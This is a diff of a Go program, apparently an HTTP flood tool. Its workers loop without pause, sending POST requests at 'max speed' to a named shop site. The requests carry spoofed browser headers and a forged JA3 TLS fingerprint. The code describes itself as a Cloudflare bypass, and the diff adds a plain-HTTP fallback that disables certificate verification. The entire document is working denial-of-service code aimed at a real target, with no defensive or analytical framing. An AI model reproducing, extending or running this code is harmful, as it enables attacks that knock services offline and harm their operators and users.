@@ -2,9 +2,12 @@ package main
 
 import (
 	"bufio"
+	"context"
+	"crypto/tls"
 	"fmt"
 	mathrand "math/rand"
 	"net"
+	"net/http"
 	"net/url"
 	"os"
 	"runtime"
@@ -237,6 +240,7 @@ func removeProxy(p Proxy) {
 var (
 	cycleTLSClient cycletls.CycleTLS
 	clientOnce     sync.Once
+	useCycleTLS    bool
 )
 
 func getCycleTLSClient() cycletls.CycleTLS {
@@ -245,52 +249,109 @@ func getCycleTLSClient() cycletls.CycleTLS {
 		cycleTLSClient = cycletls.Init()
 		if cycleTLSClient.ReqChan == nil {
 			fmt.Println("[ERROR] CycleTLS failed to initialize!")
+			useCycleTLS = false
 		} else {
 			fmt.Println("[DEBUG] CycleTLS initialized successfully")
+			useCycleTLS = true
 		}
 	})
 	return cycleTLSClient
 }
 
-// ── Worker với CycleTLS ───────────────────────────────────────────────────────
+// ── HTTP fallback client ──────────────────────────────────────────────────────
+func newHTTPClient() *http.Client {
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		DialContext: (&net.Dialer{
+			Timeout:   REQ_TIMEOUT,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+		TLSHandshakeTimeout:   REQ_TIMEOUT,
+		ResponseHeaderTimeout: REQ_TIMEOUT,
+		MaxIdleConnsPerHost:   50,
+		IdleConnTimeout:       30 * time.Second,
+	}
+	return &http.Client{
+		Transport: tr,
+		Timeout:   REQ_TIMEOUT,
+	}
+}
+
+var httpClient = newHTTPClient()
+
+// ── Worker với CycleTLS hoặc HTTP fallback ───────────────────────────────────
 func workerDirect() {
 	client := getCycleTLSClient()
+
 	for {
 		body := buildBody()
 		atomic.AddInt64(&statSent, 1)
 
-		response, err := client.Do(TARGET_URL, cycletls.Options{
-			Body:      body,
-			Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
-			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-			Headers: map[string]string{
-				"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-				"Accept-Language":  "en-US,en;q=0.9",
-				"Accept-Encoding":  "gzip, deflate, br",
-				"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
-				"X-Requested-With": "XMLHttpRequest",
-				"Origin":           "https://dkshop.dev",
-				"Referer":          "https://dkshop.dev/",
-				"Connection":       "keep-alive",
-				"Sec-Fetch-Dest":   "empty",
-				"Sec-Fetch-Mode":   "cors",
-				"Sec-Fetch-Site":   "same-origin",
-			},
-		}, "POST")
+		if useCycleTLS {
+			// Dùng CycleTLS
+			response, err := client.Do(TARGET_URL, cycletls.Options{
+				Body:      body,
+				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
+				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+				Headers: map[string]string{
+					"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+					"Accept-Language":  "en-US,en;q=0.9",
+					"Accept-Encoding":  "gzip, deflate, br",
+					"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
+					"X-Requested-With": "XMLHttpRequest",
+					"Origin":           "https://dkshop.dev",
+					"Referer":          "https://dkshop.dev/",
+					"Connection":       "keep-alive",
+					"Sec-Fetch-Dest":   "empty",
+					"Sec-Fetch-Mode":   "cors",
+					"Sec-Fetch-Site":   "same-origin",
+				},
+			}, "POST")
 
-		if err != nil {
-			atomic.AddInt64(&statFail, 1)
-			if atomic.LoadInt64(&statFail) <= 5 {
-				fmt.Printf("\n[DEBUG] Request failed: %v\n", err)
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				if atomic.LoadInt64(&statFail) <= 5 {
+					fmt.Printf("\n[DEBUG] CycleTLS request failed: %v\n", err)
+				}
+				continue
 			}
-			continue
-		}
 
-		atomic.AddInt64(&statBytes, int64(len(response.Body)+len(body)))
-		atomic.AddInt64(&statSuccess, 1)
+			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(body)))
+			atomic.AddInt64(&statSuccess, 1)
 
-		if atomic.LoadInt64(&statSuccess) <= 3 {
-			fmt.Printf("\n[DEBUG] Success! Status: %d, Body length: %d\n", response.Status, len(response.Body))
+			if atomic.LoadInt64(&statSuccess) <= 3 {
+				fmt.Printf("\n[DEBUG] Success! Status: %d, Body length: %d\n", response.Status, len(response.Body))
+			}
+		} else {
+			// Fallback HTTP thông thường
+			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(body))
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				continue
+			}
+
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			req.Header.Set("X-Requested-With", "XMLHttpRequest")
+			req.Header.Set("Origin", "https://dkshop.dev")
+			req.Header.Set("Referer", "https://dkshop.dev/")
+
+			resp, err := httpClient.Do(req)
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				if atomic.LoadInt64(&statFail) <= 5 {
+					fmt.Printf("\n[DEBUG] HTTP request failed: %v\n", err)
+				}
+				continue
+			}
+
+			resp.Body.Close()
+			atomic.AddInt64(&statBytes, int64(len(body)))
+			atomic.AddInt64(&statSuccess, 1)
+
+			if atomic.LoadInt64(&statSuccess) <= 3 {
+				fmt.Printf("\n[DEBUG] HTTP Success! Status: %d\n", resp.StatusCode)
+			}
 		}
 	}
 }
@@ -447,30 +508,44 @@ func main() {
 		fmt.Println("[*] Direct mode - max speed")
 		fmt.Println("[*] Testing connection first...")
 
-		// Test 1 request trước
+		// Test CycleTLS trước
 		testClient := getCycleTLSClient()
-		if testClient.ReqChan == nil {
-			fmt.Println("[ERROR] CycleTLS not available, exiting...")
-			return
-		}
 
-		testBody := buildBody()
-		testResp, testErr := testClient.Do(TARGET_URL, cycletls.Options{
-			Body:      testBody,
-			Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
-			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-			Headers: map[string]string{
-				"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-				"Origin":       "https://dkshop.dev",
-				"Referer":      "https://dkshop.dev/",
-			},
-		}, "POST")
+		if useCycleTLS {
+			fmt.Println("[*] Using CycleTLS for Cloudflare bypass")
+			testBody := buildBody()
+			testResp, testErr := testClient.Do(TARGET_URL, cycletls.Options{
+				Body:      testBody,
+				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
+				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+				Headers: map[string]string{
+					"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+					"Origin":       "https://dkshop.dev",
+					"Referer":      "https://dkshop.dev/",
+				},
+			}, "POST")
 
-		if testErr != nil {
-			fmt.Printf("[ERROR] Test request failed: %v\n", testErr)
-			fmt.Println("[*] Continuing anyway...")
+			if testErr != nil {
+				fmt.Printf("[ERROR] CycleTLS test request failed: %v\n", testErr)
+			} else {
+				fmt.Printf("[SUCCESS] CycleTLS test OK! Status: %d, Body: %d bytes\n", testResp.Status, len(testResp.Body))
+			}
 		} else {
-			fmt.Printf("[SUCCESS] Test request OK! Status: %d, Body: %d bytes\n", testResp.Status, len(testResp.Body))
+			fmt.Println("[*] CycleTLS not available, using standard HTTP")
+			testBody := buildBody()
+			testReq, _ := http.NewRequest("POST", TARGET_URL, strings.NewReader(testBody))
+			testReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+			testReq.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			testReq.Header.Set("Origin", "https://dkshop.dev")
+			testReq.Header.Set("Referer", "https://dkshop.dev/")
+
+			testResp, testErr := httpClient.Do(testReq)
+			if testErr != nil {
+				fmt.Printf("[ERROR] HTTP test request failed: %v\n", testErr)
+			} else {
+				testResp.Body.Close()
+				fmt.Printf("[SUCCESS] HTTP test OK! Status: %d\n", testResp.StatusCode)
+			}
 		}
 
 		start := time.Now()
